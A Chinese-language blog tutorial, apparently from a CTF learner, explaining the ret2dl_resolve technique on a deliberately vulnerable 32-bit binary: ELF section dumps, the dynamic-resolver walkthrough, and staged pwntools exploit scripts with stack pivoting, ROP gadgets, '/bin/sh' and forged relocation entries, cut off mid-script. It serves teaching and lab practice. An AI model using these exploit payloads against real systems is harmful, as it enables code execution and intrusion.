<h1 id="ret2dl-resolve"><a href="#ret2dl-resolve" class="headerlink" title="ret2dl_resolve"></a>ret2dl_resolve</h1><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//ret2dl.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> buffer[<span class="number">0x500</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x20</span>];</span><br><span class="line">    read(<span class="number">0</span>,buf,<span class="number">0x200</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;vuln\n&quot;</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;COPY</span><br><span class="line">gcc ret2dl.c -o test -m32 -fno-<span class="built_in">stack</span>-protector</span><br></pre></td></tr></table></figure>

<h3 id="elf-段分布"><a href="#elf-段分布" class="headerlink" title="elf 段分布"></a>elf 段分布</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">shiroha@ubuntu:~/ret2dl$ readelf -S test </span><br><span class="line">There are 31 section headers, starting at offset 0x1830:</span><br><span class="line"></span><br><span class="line">Section Headers:</span><br><span class="line">  [Nr] Name              Type            Addr     Off    Size   ES Flg Lk Inf Al</span><br><span class="line">  [ 0]                   NULL            00000000 000000 000000 00      0   0  0</span><br><span class="line">  [ 1] .interp           PROGBITS        08048154 000154 000013 00   A  0   0  1</span><br><span class="line">  [ 2] .note.ABI-tag     NOTE            08048168 000168 000020 00   A  0   0  4</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE            08048188 000188 000024 00   A  0   0  4</span><br><span class="line">  [ 4] .gnu.hash         GNU_HASH        080481ac 0001ac 000020 04   A  5   0  4</span><br><span class="line">  [ 5] .dynsym           DYNSYM          080481cc 0001cc 000060 10   A  6   1  4</span><br><span class="line">  [ 6] .dynstr           STRTAB          0804822c 00022c 000050 00   A  0   0  1</span><br><span class="line">  [ 7] .gnu.version      VERSYM          0804827c 00027c 00000c 02   A  5   0  2</span><br><span class="line">  [ 8] .gnu.version_r    VERNEED         08048288 000288 000020 00   A  6   1  4</span><br><span class="line">  [ 9] .rel.dyn          REL             080482a8 0002a8 000008 08   A  5   0  4</span><br><span class="line">  [10] .rel.plt          REL             080482b0 0002b0 000018 08  AI  5  24  4</span><br><span class="line">  [11] .init             PROGBITS        080482c8 0002c8 000023 00  AX  0   0  4</span><br><span class="line">  [12] .plt              PROGBITS        080482f0 0002f0 000040 04  AX  0   0 16</span><br><span class="line">  [13] .plt.got          PROGBITS        08048330 000330 000008 00  AX  0   0  8</span><br><span class="line">  [14] .text             PROGBITS        08048340 000340 0001c2 00  AX  0   0 16</span><br><span class="line">  [15] .fini             PROGBITS        08048504 000504 000014 00  AX  0   0  4</span><br><span class="line">  [16] .rodata           PROGBITS        08048518 000518 00000e 00   A  0   0  4</span><br><span class="line">  [17] .eh_frame_hdr     PROGBITS        08048528 000528 000034 00   A  0   0  4</span><br><span class="line">  [18] .eh_frame         PROGBITS        0804855c 00055c 0000ec 00   A  0   0  4</span><br><span class="line">  [19] .init_array       INIT_ARRAY      08049f08 000f08 000004 00  WA  0   0  4</span><br><span class="line">  [20] .fini_array       FINI_ARRAY      08049f0c 000f0c 000004 00  WA  0   0  4</span><br><span class="line">  [21] .jcr              PROGBITS        08049f10 000f10 000004 00  WA  0   0  4</span><br><span class="line">  [22] .dynamic          DYNAMIC         08049f14 000f14 0000e8 08  WA  6   0  4</span><br><span class="line">  [23] .got              PROGBITS        08049ffc 000ffc 000004 04  WA  0   0  4</span><br><span class="line">  [24] .got.plt          PROGBITS        0804a000 001000 000018 04  WA  0   0  4</span><br><span class="line">  [25] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4</span><br><span class="line">  [26] .bss              NOBITS          0804a020 001020 001420 00  WA  0   0 32</span><br><span class="line">  [27] .comment          PROGBITS        00000000 001020 000035 01  MS  0   0  1</span><br><span class="line">  [28] .shstrtab         STRTAB          00000000 001723 00010a 00      0   0  1</span><br><span class="line">  [29] .symtab           SYMTAB          00000000 001058 000480 10     30  47  4</span><br><span class="line">  [30] .strtab           STRTAB          00000000 0014d8 00024b 00      0   0  1COPY</span><br></pre></td></tr></table></figure>

<p>关键的有</p>
<ol>
<li> <strong>bss -&gt; 0804a020</strong></li>
<li> <strong>dynsym -&gt; 0x080481cc</strong></li>
<li> <strong>dynstr -&gt; 0x0804822c</strong></li>
<li> <strong>plt -&gt; 0x080482f0</strong></li>
<li> <strong>rel.plt -&gt; 0x080482b0</strong></li>
<li> <strong>dynamic -&gt; 0x08049F14</strong></li>
</ol>
<h3 id="第一次调用函数"><a href="#第一次调用函数" class="headerlink" title="第一次调用函数"></a>第一次调用函数</h3><p><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402163856904.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402163856904-300x295.png" alt="img"></a></p>
<p>第一次调用的时候</p>
<ol>
<li> <code>jmp</code> 到 <code>plt + 6</code> 也就是下一条指令</li>
<li> <code>push 0</code>(为什么是0?</li>
<li> <code>jmp</code> 到 接下来要调用的 <code>_dl_runtime_resolve</code></li>
</ol>
<p><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402164356634.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402164356634-300x288.png" alt="img"></a></p>
<ol>
<li> 首先 <code>push</code> 了 <code>link map</code></li>
<li> <code>jmp _dl_runtim_resolve</code></li>
</ol>
<p>看一下 <code>push</code> 的地址里面有啥</p>
<p><a href="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402164634613.png"><img src="http://49.234.181.139/wp-content/uploads/2020/04/image-20200402164634613-300x27.png" alt="img"></a></p>
<p>第三个数据就是 <code>dynamic</code> 段的地址</p>
<h4 id="dynamic"><a href="#dynamic" class="headerlink" title=".dynamic"></a>.dynamic</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:08049F14 ; Segment type: Pure data</span><br><span class="line">LOAD:08049F14 ; Segment permissions: Read&#x2F;Write</span><br><span class="line">LOAD:08049F14 LOAD            segment mempage public &#39;DATA&#39; use32</span><br><span class="line">LOAD:08049F14                 assume cs:LOAD</span><br><span class="line">LOAD:08049F14                 ;org 8049F14h</span><br><span class="line">LOAD:08049F14 _DYNAMIC        Elf32_Dyn &lt;1, &lt;1&gt;&gt;      ; DATA XREF: LOAD:080480BC↑o</span><br><span class="line">LOAD:08049F14                                         ; .got.plt:_GLOBAL_OFFSET_TABLE_↓o</span><br><span class="line">LOAD:08049F14                                         ; DT_NEEDED libc.so.6</span><br><span class="line">LOAD:08049F1C                 Elf32_Dyn &lt;0Ch, &lt;80482A8h&gt;&gt; ; DT_INIT</span><br><span class="line">LOAD:08049F24                 Elf32_Dyn &lt;0Dh, &lt;80484A4h&gt;&gt; ; DT_FINI</span><br><span class="line">LOAD:08049F2C                 Elf32_Dyn &lt;19h, &lt;8049F08h&gt;&gt; ; DT_INIT_ARRAY</span><br><span class="line">LOAD:08049F34                 Elf32_Dyn &lt;1Bh, &lt;4&gt;&gt;    ; DT_INIT_ARRAYSZ</span><br><span class="line">LOAD:08049F3C                 Elf32_Dyn &lt;1Ah, &lt;8049F0Ch&gt;&gt; ; DT_FINI_ARRAY</span><br><span class="line">LOAD:08049F44                 Elf32_Dyn &lt;1Ch, &lt;4&gt;&gt;    ; DT_FINI_ARRAYSZ</span><br><span class="line">LOAD:08049F4C                 Elf32_Dyn &lt;6FFFFEF5h, &lt;80481ACh&gt;&gt; ; DT_GNU_HASH</span><br><span class="line">LOAD:08049F54                 Elf32_Dyn &lt;5, &lt;804821Ch&gt;&gt; ; DT_STRTAB</span><br><span class="line">LOAD:08049F5C                 Elf32_Dyn &lt;6, &lt;80481CCh&gt;&gt; ; DT_SYMTAB</span><br><span class="line">LOAD:08049F64                 Elf32_Dyn &lt;0Ah, &lt;4Ah&gt;&gt;  ; DT_STRSZ</span><br><span class="line">LOAD:08049F6C                 Elf32_Dyn &lt;0Bh, &lt;10h&gt;&gt;  ; DT_SYMENT</span><br><span class="line">LOAD:08049F74                 Elf32_Dyn &lt;15h, &lt;0&gt;&gt;    ; DT_DEBUG</span><br><span class="line">LOAD:08049F7C                 Elf32_Dyn &lt;3, &lt;804A000h&gt;&gt; ; DT_PLTGOT</span><br><span class="line">LOAD:08049F84                 Elf32_Dyn &lt;2, &lt;10h&gt;&gt;    ; DT_PLTRELSZ</span><br><span class="line">LOAD:08049F8C                 Elf32_Dyn &lt;14h, &lt;11h&gt;&gt;  ; DT_PLTREL</span><br><span class="line">LOAD:08049F94                 Elf32_Dyn &lt;17h, &lt;8048298h&gt;&gt; ; DT_JMPREL</span><br><span class="line">LOAD:08049F9C                 Elf32_Dyn &lt;11h, &lt;8048290h&gt;&gt; ; DT_REL</span><br><span class="line">LOAD:08049FA4                 Elf32_Dyn &lt;12h, &lt;8&gt;&gt;    ; DT_RELSZ</span><br><span class="line">LOAD:08049FAC                 Elf32_Dyn &lt;13h, &lt;8&gt;&gt;    ; DT_RELENT</span><br><span class="line">LOAD:08049FB4                 Elf32_Dyn &lt;6FFFFFFEh, &lt;8048270h&gt;&gt; ; DT_VERNEED</span><br><span class="line">LOAD:08049FBC                 Elf32_Dyn &lt;6FFFFFFFh, &lt;1&gt;&gt; ; DT_VERNEEDNUM</span><br><span class="line">LOAD:08049FC4                 Elf32_Dyn &lt;6FFFFFF0h, &lt;8048266h&gt;&gt; ; DT_VERSYM</span><br><span class="line">LOAD:08049FCC                 Elf32_Dyn &lt;0&gt;           ; DT_NULL</span><br></pre></td></tr></table></figure>

<p>其中</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DT_STRTAB -&gt; 0x804821C(.dynstr)</span><br><span class="line">DT_SYMTAB -&gt; 0x80481CC(.dynsym)</span><br><span class="line">DT_JMPREL -&gt; 0x8048298(.rel.plt)</span><br><span class="line">&#x2F;&#x2F;dynamic </span><br><span class="line">typedef struct &#123;</span><br><span class="line">    Elf32_Sword d_tag;</span><br><span class="line">    union &#123;</span><br><span class="line">        Elf32_Word d_val;</span><br><span class="line">        Elf32_Addr d_ptr;</span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;COPY</span><br></pre></td></tr></table></figure>

<h4 id="dynsym"><a href="#dynsym" class="headerlink" title=".dynsym"></a>.dynsym</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:080481CC ; ELF Symbol Table</span><br><span class="line">LOAD:080481CC                 Elf32_Sym &lt;0&gt;</span><br><span class="line">LOAD:080481DC                 Elf32_Sym &lt;offset aRead - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br><span class="line">LOAD:080481EC                 Elf32_Sym &lt;offset aGmonStart - offset byte_804822C, 0, 0, 20h, 0, 0&gt; ; &quot;__gmon_start__&quot;</span><br><span class="line">LOAD:080481FC                 Elf32_Sym &lt;offset aLibcStartMain - offset byte_804822C, 0, 0, 12h, 0, \ ; &quot;__libc_start_main&quot;</span><br><span class="line">LOAD:080481FC                            0&gt;</span><br><span class="line">LOAD:0804820C                 Elf32_Sym &lt;offset aWrite - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;write&quot;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804822C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804821C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br><span class="line">LOAD:0804822C ; ELF String Table</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Word    st_name;</span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  unsigned char st_info; </span><br><span class="line">  unsigned char st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_SymCOPY</span><br></pre></td></tr></table></figure>

<p><code>st_name -&gt; (offset aRead - offset byte_804821C(.dynstr))</code> 即 <strong>需要载入的函数符号相对于符号表的偏移量</strong></p>
<p><code>st_info -&gt; 12h</code> 对于导入符号 这里应为 0x12</p>
<p>其余字段均为0</p>
<h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a>.rel.plt</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LOAD:080482A8 ; ELF REL Relocation Table</span><br><span class="line">LOAD:080482A8                 Elf32_Rel &lt;8049FFCh, 206h&gt; ; R_386_GLOB_DAT __gmon_start__</span><br><span class="line">LOAD:080482B0 ; ELF JMPREL Relocation Table</span><br><span class="line">LOAD:080482B0                 Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br><span class="line">LOAD:080482B8                 Elf32_Rel &lt;804A010h, 307h&gt; ; R_386_JMP_SLOT __libc_start_main</span><br><span class="line">LOAD:080482C0                 Elf32_Rel &lt;804A014h, 407h&gt; ; R_386_JMP_SLOT write</span><br><span class="line">LOAD:080482C0 LOAD            ends</span><br><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  Elf32_Addr    r_offset; </span><br><span class="line">  Elf32_Word    r_info;</span><br><span class="line">&#125; Elf32_Rel;COPY</span><br><span class="line">r_offset -&gt; 0x804A00C(read@got)</span><br><span class="line">r_info &gt;&gt; 8 得到一个下标(1),对应 导入符号在 .dynsym 中的下标</span><br></pre></td></tr></table></figure>

<h4 id="实际过程"><a href="#实际过程" class="headerlink" title="实际过程"></a>实际过程</h4><p>相当于调用了一次</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">_dl_runtime_resolve(link_map,reloc_arg)</span><br><span class="line">reloc_arg 为导入函数在 .rel.plt 中的偏移(此处为0</span><br></pre></td></tr></table></figure>

<p>第一次调用完毕之后<code>read@got</code> 就会写入 read 在 libc 中的地址</p>
<h3 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x3D;&gt; 0xf7fee000 &lt;_dl_runtime_resolve&gt;:   push   eax</span><br><span class="line">   0xf7fee001 &lt;_dl_runtime_resolve+1&gt;:    push   ecx</span><br><span class="line">   0xf7fee002 &lt;_dl_runtime_resolve+2&gt;:    push   edx</span><br><span class="line">   0xf7fee003 &lt;_dl_runtime_resolve+3&gt;:    mov    edx,DWORD PTR [esp+0x10]</span><br><span class="line">   0xf7fee007 &lt;_dl_runtime_resolve+7&gt;:    mov    eax,DWORD PTR [esp+0xc]</span><br><span class="line">   0xf7fee00b &lt;_dl_runtime_resolve+11&gt;:   call   0xf7fe77e0 &lt;_dl_fixup&gt;</span><br><span class="line">   0xf7fee010 &lt;_dl_runtime_resolve+16&gt;:   pop    edx</span><br><span class="line">   0xf7fee011 &lt;_dl_runtime_resolve+17&gt;:   mov    ecx,DWORD PTR [esp]</span><br><span class="line">   0xf7fee014 &lt;_dl_runtime_resolve+20&gt;:   mov    DWORD PTR [esp],eax</span><br><span class="line">   0xf7fee017 &lt;_dl_runtime_resolve+23&gt;:   mov    eax,DWORD PTR [esp+0x4]COPY</span><br></pre></td></tr></table></figure>

<p>咱也不讲 <code>_dl_fixup</code>函数了,这个之后有时间在细看</p>
<h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><ol>
<li> 用 <code>link_map</code> 访问 <a href="http://ethushiroha.com/?p=869#.dynamic">.dynamic</a> 从中取出 <a href="http://ethushiroha.com/.dynsym">.dynsym</a>,<a href="http://ethushiroha.com/.dynstr">.dynstr</a>,<a href="http://ethushiroha.com/.rel.plt">.rel.plt</a></li>
<li> <code>.rel.plt</code> + <code>reloc_arg</code> 得到当前函数的 <code>Elf32_Rel</code> 结构体,记作 <code>rel</code></li>
<li> <code>rel -&gt; r_info &gt;&gt; 8</code> 作为 <code>.dynsym</code> 的下标 得出当前函数的 <code>Elf32_Sym</code> 结构体,记作 <code>sym</code></li>
<li> <code>.dynstr + sym -&gt; st_name</code> 得出符号表的字符串指针</li>
<li> 在 <code>libc</code> 中查找 <code>.synstr[sym-&gt;st_name]</code> 的地址,并且写入 <code>rel -&gt; r_offset</code> 即 <code>got</code>表中</li>
<li> 调用这个函数</li>
</ol>
<h3 id="attack"><a href="#attack" class="headerlink" title="attack"></a>attack</h3><p>问题点在于使用 <code>.rel.plt + reloc_arg</code> 的时候,并没有检查 是否越界 ,</p>
<p>如果给出一个很大的 <code>offset</code> 使得这个指针指向能够控制的空间(<code>.bss</code>)</p>
<p>在 伪造的 <code>Elf32_Rel</code> 结构体中,放入一个<code>r_info</code>字段,使得 <code>r_info = 0x??????07</code> 其中的 <code>??????</code> 是相对于 <code>.synsym</code> 的下标 <strong>(偏移 / 0x10)</strong>,这里也没有越界检查 , 同样将其指向 <code>.bss</code> 段 伪造一个 <code>Elf32_Sym</code> 结构体</p>
<p>在 伪造的 <code>sym</code> 结构体中 <code>st_name</code> 越界 <code>.symstr</code> 伪造虚假的函数符号</p>
<h3 id="尝试ing"><a href="#尝试ing" class="headerlink" title="尝试ing"></a>尝试ing</h3><h4 id="stage1"><a href="#stage1" class="headerlink" title="stage1"></a>stage1</h4><p>栈迁移之后控制返回地址</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">borrowStack()</span><br><span class="line">over1()COPY</span><br></pre></td></tr></table></figure>

<h4 id="stage2"><a href="#stage2" class="headerlink" title="stage2"></a>stage2</h4><p>栈迁移之后用真的 <code>Elf32_Rel</code> 结构体和偏移去执行 <code>write</code> 函数</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span>            <span class="comment"># 正常的下标</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">COPY</span><br></pre></td></tr></table></figure>

<h4 id="stage3"><a href="#stage3" class="headerlink" title="stage3"></a>stage3</h4><p>使用越界的下标,让<code>.rel.plt + reloc_arg</code> 下标越界,指向 <code>.bss(stack) + 28</code> 的地方,并在那里伪造虚假的<code>Elf32_Rel</code> 结构体</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./test&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./test&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/gstalker/buu/libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss = <span class="number">0x0804a020</span></span><br><span class="line">offset = <span class="number">0x200</span></span><br><span class="line">stack = bss + offset</span><br><span class="line">leave_ret = <span class="number">0x08048458</span></span><br><span class="line">main = <span class="number">0x0804845A</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">ppp_ret = <span class="number">0x080484f9</span></span><br><span class="line">pop_ebp = <span class="number">0x080484fb</span></span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">plt0 = <span class="number">0x080482F0</span></span><br><span class="line">rel_plt = <span class="number">0x080482b0</span></span><br><span class="line">dynsym = <span class="number">0x080481cc</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">borrowStack</span>():</span></span><br><span class="line">    junk = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x28</span></span><br><span class="line">    payload = junk + p32(bss + offset)</span><br><span class="line">    payload += p32(read_plt) + p32(ppp_ret) </span><br><span class="line">    payload += p32(<span class="number">0</span>) + p32(bss + offset) + p32(<span class="number">0x200</span>)</span><br><span class="line">    payload += p32(pop_ebp) + p32(bss + offset) + p32(leave_ret)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;vuln&quot;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over1</span>():</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x4</span></span><br><span class="line">    payload += p32(write) + p32(main)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over2</span>():</span></span><br><span class="line">    write_index = (write - plt0) / <span class="number">16</span> - <span class="number">1</span></span><br><span class="line">    write_index *= <span class="number">8</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(write_index)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += p32(<span class="number">1</span>) + p32(bss + offset + <span class="number">0x80</span>) + p32(<span class="number">0x8</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x80</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload = payload.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">over3</span>():</span></span><br><span class="line">    r_info = <span class="number">0x407</span></span><br><span class="line">    index_offset = (stack + <span class="number">28</span> - rel_plt)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span></span><br><span class="line">    payload += p32(plt0)</span><br><span class="line">    payload += p32(<span class="built_in">int</span>(index_offset)) + p32(<span class="number">0xdead</span>)</span><br><span class="line">    payload += 